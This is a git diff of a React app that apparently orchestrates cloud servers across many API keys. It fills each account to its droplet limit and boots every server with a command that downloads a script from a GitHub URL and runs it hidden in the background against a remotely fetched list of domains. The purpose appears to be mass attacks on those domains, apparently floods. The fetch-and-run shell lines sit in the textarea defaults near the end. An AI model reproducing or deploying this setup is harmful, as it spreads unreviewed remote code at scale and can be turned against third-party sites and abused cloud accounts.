@@ -41,7 +41,7 @@ function App() {
     password: ''
   })
   const [loadingState, setLoadingState] = useState({})
-  const [strategy, setStrategy] = useState('v2')
+  const [strategy, setStrategy] = useState('V2')
   const [domainsURL, setDomainsURL] = useState("https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/list.txt")
 
   const setLoading = (apiKey, loading) => {
@@ -232,11 +232,15 @@ function App() {
     getAllData(keys)
   }
 
-  const getExecCommand = () => {
+  const getExecCommand = ({dropletname}) => {
     let exec = $exec.current.value.trim();
 
     exec = exec.replace('{password}', creds.password);
     exec = exec.replace('{login}', creds.login);
+
+    if(strategy === 'V2') {
+      exec = exec.replace('{dropletname}', dropletname || `d-${Date.now()}`);
+    }
 
     return exec.split('\n')
   }
@@ -253,7 +257,7 @@ function App() {
     await api.createDroplet({
       name,
       creds,
-      exec: getExecCommand(),
+      exec: getExecCommand({dropletname: name}),
       apiKey,
     })
 
@@ -277,12 +281,30 @@ function App() {
     await api.createDroplets({
       names,
       creds,
-      exec: getExecCommand(),
+      exec: getExecCommand({dropletname: names}),
       apiKey
     })
 
     await getData(apiKey)
     setLoading(apiKey, false)
+  }
+
+  const _fillDroplets = async ({prefix, apiKey}) =>  {
+    const droplets = await api.getAllDroplets({apiKey})
+    const account = await api.getAccountData({apiKey})
+
+    const limit = account.droplet_limit - droplets.length;
+
+    const names = Array(Number(limit)).fill(1).map((c, x) => `${prefix}${x + 1}`)
+
+    const execCommands = names.map(name => getExecCommand({dropletname: name}))
+
+    await api.fillDroplets({
+      names,
+      creds,
+      execCommands,
+      apiKey
+    })
   }
 
   const fillDroplets = apiKey => async () => {
@@ -294,11 +316,8 @@ function App() {
 
     setLoading(apiKey, true)
 
-
-    await api.fillDroplets({
+    await _fillDroplets({
       prefix,
-      creds,
-      exec: getExecCommand(),
       apiKey
     })
 
@@ -348,12 +367,12 @@ function App() {
     }))
 
     await Promise.all(apiKeys.map(async apiKey => {
-      return await api.fillDroplets({
+      await _fillDroplets({
         prefix,
-        creds,
-        exec: getExecCommand(),
         apiKey
       })
+
+      return await getData(apiKey)
     }))
 
     apiKeys.forEach(async apiKey => {
@@ -373,10 +392,8 @@ function App() {
     })
 
     apiKeys.forEach(async apiKey => {
-      await api.fillDroplets({
+      await _fillDroplets({
         prefix,
-        creds,
-        exec: getExecCommand(),
         apiKey
       })
 
@@ -410,7 +427,7 @@ function App() {
           <div className="col">
             <h4>Strategy</h4>
             <div className="form-check form-check-inline">
-              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" onChange={() => setStrategy('V2')} checked={strategy === 'v2'}/>
+              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" onChange={() => setStrategy('V2')} checked={strategy === 'V2'}/>
               <label className="form-check-label" htmlFor="flexRadioDefault2">
                 V2
               </label>
@@ -432,7 +449,22 @@ function App() {
         <div className="row">
           <div className="col">
             <label className="form-label">Exec command:</label>
-            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" onChange={() => { }} value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/' + (strategy === 'custom' ? 'custom' : 'dc') + '.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f ' + domainsURL + ' >/dev/null 2>&1 &'} />
+            {strategy === 'custom' && <textarea
+              ref={$exec}
+              rows={"4"}
+              cols={"75"}
+              className="form-control mb-1"
+              onChange={() => { }}
+              value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/custom.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f ' + domainsURL + ' >/dev/null 2>&1 &'}
+            />}
+            {strategy === 'V2' && <textarea
+              ref={$exec}
+              rows={"4"}
+              cols={"75"}
+              className="form-control mb-1"
+              onChange={() => { }}
+              value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/dc.txt && chmod +x a.sh && nohup ./a.sh -n {login} -d {dropletname} -f ' + domainsURL + ' >/dev/null 2>&1 &'}
+            />}
           </div>
         </div>
         <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
